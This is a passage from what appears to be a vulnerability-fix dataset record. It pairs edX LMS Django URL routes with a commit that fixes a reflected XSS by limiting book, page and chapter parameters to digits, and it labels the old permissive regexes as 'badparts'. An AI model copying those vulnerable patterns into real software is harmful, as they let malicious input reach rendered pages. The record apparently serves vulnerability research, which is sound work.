url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"}}, "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page.\n\nConflicts:\n\tlms/urls.py"}, "5fad9ccca43cdfb565b3f80914f998afa7f2fa78": {"url": "https://api.github.com/repos/ExtensionEngine/ed2go-edx-platform/commits/5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "html_url": "https://github.com/ExtensionEngine/ed2go-edx-platform/commit/5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "sha": "5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "keyword": "XSS malicious", "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 51c6ba13b7..b131bb8f0b 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,24 +223,24 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n", "message": "", "files": {"/lms/urls.py": {"changes": [{"diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n", "add": 8, "remove": 8, "filename": "/lms/urls.py", "badparts": ["        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',"], "goodparts": ["        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"]}], "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns 